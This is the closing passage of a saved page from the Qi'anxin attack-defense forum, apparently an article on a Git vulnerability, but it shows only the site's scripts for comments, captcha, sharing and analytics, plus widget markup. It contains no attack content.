                $('#mobile-toc').hide();
            })
            var tocContent = $('#mobile-toc').text();
            if(!tocContent) {
                 $('#mobile-toc').hide();
                 $('.fixed-toc-button').hide();
            }

            // 吸顶
            $(window).scroll(window.throttle(function() {
                if($(window).scrollTop() > 109){
                var w = $("#toc").outerWidth();
                $("#toc").css({"width": w}).addClass('tocFixed');
            }else{
                $("#toc").css({"width": '100%'}).removeClass('tocFixed');
            }
            }, 50));

            $(".add-more-comment").on("click", function(){
                var _this = $(this)
                var source = _this.data("source")
                $.ajax({
                    type: "GET",
                    url: `/${source}/secondaryComment`,
                    success: function (data) {
                        var renderHtml = ''
                        $.each(data, function (index, item){
                            renderHtml += `<div class="media">
                                                <div class="media-left">
                                                    <a href="" class="avatar-link user-card" target="_blank" rel="noopenner noreferrer">
                                                        <img class="avatar-40 hidden-xs" src="${item.user.avatar}" alt="">
                                                    </a>
                                                </div>
                                                <div class="media-body">
                                                    <div class="media-heading">
                                                        <a href="" class="mr-5 user-card">${item.user.name}</a>`
                                                        if(item.to_user){
                                                            renderHtml += `<span>回复</span><a href="" class="mr-5 user-card">${item.to_user.name}</a>`
                                                        }
                                    renderHtml += `</div>
                                                    <div class="content">
                                                        <div class="text-fmt mt-10 mb-10">${item.content}</div>
                                                    </div>
                                                    <div class="media-footer">
                                                        <ul class="list-inline text-muted">
                                                            <li>${item.created_at}</li>
                                                            <li>
                                                                <span class="ml-10 second-comment-reply" data-source="${source}" data-source_id="${item.source_id}" data-to_user_id="${item.user_id}" data-source_type="comment" data-message="回复 ${item.user.name}"><i class="fa fa-reply"></i> 回复</span>
                                                            </li>
                                                            <li class="pull-right">
                                                                <button class="btn btn-default btn-xs btn-support`
                                                                    if(item.is_supoort){
                                                                        renderHtml += ` support-success`
                                                                    }
                                    renderHtml += `" data-source_id="${item.id}" data-source_type="comment" data-support_num="${item.supports}"><i class="fa fa-thumbs-o-up"></i> ${item.supports}</button>
                                                            </li>
                                                        </ul>
                                                    </div>
                                                </div>
                                            </div>`
                        })
                        _this.before(renderHtml)
                        _this.hide()
                        
                    },
                    error: function (data) {
                        var errors = data.responseJSON.errors.content;
                        alert(errors)
                    }
                })
            })
            var params = {}
            $(".comment-btn, .seconed-comment-btn").on("click", function(){
                // source_id：一级评论值为文章id  二级评论为一级评论的id
                params.source_id = $(this).data('source_id');
                // source_type：community文章 answe回答 movable活动
                params.source_type = $(this).data('source_type');
                params.to_user_id = $(this).data('to_user_id');
                params.token = $(this).data('token');
                if(params.source_type === 'community') {
                    params.content = $("#comment-content").val()
                } else{
                    params.source = $(this).data('source');
                    params.content = $("#second_comment-"+params.source+"-textarea").val();
                };
                gCaptchaObj.verify(); //显示验证码
            })
            /*评论提交*/
            function submit_comment(validate) {
                var silence = 0 ;
                if(silence){
                    window.location.href = 'https://forum.butian.net/question/create'
                    return false;
                }
                params.captcha = $('input[name="geetest_challenge"]').val() || "";
                params.geetest_challenge = validate.geetest_challenge;
                params.geetest_validate = validate.geetest_validate;
                params.geetest_seccode = validate.geetest_seccode;
                handleClickAddComment(params);
                params = {}
            }

            var gCaptchaObj;
            function jyCllback(type,captchaObj) {
                if(type === 'ready'){
                    gCaptchaObj = captchaObj;
                }else if(type === 'success'){
                    var validate = gCaptchaObj.getValidate();
                    submit_comment(validate, $(this))
                }
            }
            jyInit(jyCllback)




            /*文章推荐*/
            $("#support-button").click(function() {
                var btn_support = $(this);
                var source_type = btn_support.data('source_type');
                var source_id = btn_support.data('source_id');
                var support_num = parseInt(btn_support.data('support_num'));
                $.post('/support',{_token: 'oJDo1PYed4MjwtRMLXn2JxT23YbmHt0kOn0E57gT',source_type:source_type,source_id:source_id},function(msg){
                    if (msg == 'success') {
                        support_num++
                    }
                    btn_support.html(support_num+' 已推荐');
                    btn_support.data('support_num', support_num);
                });
            });



            /*收藏问题或文章*/
            $("#collect-button").click(function(){
                var isCollected =$("#collect-button").html() ;
                $("#collect-button").button('loading');
                var source_type = $(this).data('source_type');
                var source_id = $(this).data('source_id');
                $.post('/collect',{_token: 'oJDo1PYed4MjwtRMLXn2JxT23YbmHt0kOn0E57gT',source_type:source_type,source_id:source_id},function(msg){
                    $("#collect-button").removeClass('disabled');
                    $("#collect-button").removeAttr('disabled');

                    if(msg.code === 401) {
                        window.location.replace("https://forum.butian.net/login" + "?redirectPath=" + url);
                    }

                    if(msg=='collected'){
                        $("#collect-button").html('已收藏');
                    }else if(msg == 'uncollect'){
                        $("#collect-button").html('收藏');
                    }else{
                        $("#collect-button").html(isCollected);
                    }

                });
            });

            $('.text-fmt pre').each(function(i, block) { hljs.highlightBlock(block); });
        });
    </script>
     <!-- 微信分享 -->
    <script type="text/javascript" src="./奇安信攻防社区-CVE-2024-32002 Git 远程代码执行漏洞分析_files/jweixin-1.6.0.js"></script>
    <script type="text/javascript" src="./奇安信攻防社区-CVE-2024-32002 Git 远程代码执行漏洞分析_files/share.js"></script>
    <script>
    $(function(){
        var title = escape2Html($.trim($('.title').html()));
        var description =escape2Html($.trim($('.quote').html()));
        initShare({
        APIs: ["updateAppMessageShareData", "updateTimelineShareData"],
        callback: {
          title: title,
          imgUrl:
            "https://shs3.b.qianxin.com/butian_public/f8499623f20f6b5c90e8ca94ac7fc238acf39e36be2ef.jpg",
          description: description,
          url: window.location.href,
          successMethod: ""
        }
      });
    })
    </script>

<script type="text/javascript">document.write(unescape("%3Cspan id='cnzz_stat_icon_1279782571'%3E%3C/span%3E%3Cscript src='https://s4.cnzz.com/z_stat.php%3Fid%3D1279782571' type='text/javascript'%3E%3C/script%3E"));</script><span id="cnzz_stat_icon_1279782571"><a href="https://www.cnzz.com/stat/website.php?web_id=1279782571" target="_blank" title="站长统计">站长统计</a></span><script src="./奇安信攻防社区-CVE-2024-32002 Git 远程代码执行漏洞分析_files/z_stat.php" type="text/javascript"></script><script src="./奇安信攻防社区-CVE-2024-32002 Git 远程代码执行漏洞分析_files/c.js" charset="utf-8" type="text/javascript"></script>



<div class="geetest_panel geetest_wind" style="display: none;"><div class="geetest_panel_ghost"></div><div class="geetest_panel_box"><div class="geetest_other_offline geetest_panel_offline"></div><div class="geetest_panel_loading"><div class="geetest_panel_loading_icon"></div><div class="geetest_panel_loading_content">智能验证检测中</div></div><div class="geetest_panel_success"><div class="geetest_panel_success_box"><div class="geetest_panel_success_show"><div class="geetest_panel_success_pie"></div><div class="geetest_panel_success_filter"></div><div class="geetest_panel_success_mask"></div></div><div class="geetest_panel_success_correct"><div class="geetest_panel_success_icon"></div></div></div><div class="geetest_panel_success_title">通过验证</div></div><div class="geetest_panel_error"><div class="geetest_panel_error_icon"></div><div class="geetest_panel_error_title">网络超时</div><div class="geetest_panel_error_content">请点击此处重试</div><div class="geetest_panel_error_code"><div class="geetest_panel_error_code_text"></div></div></div><div class="geetest_panel_footer"><div class="geetest_panel_footer_logo"></div><div class="geetest_panel_footer_copyright">由极验提供技术支持</div></div><div class="geetest_panel_next"></div></div></div><div class="layui-layer-move" style="cursor: move; display: none;"></div></body></html>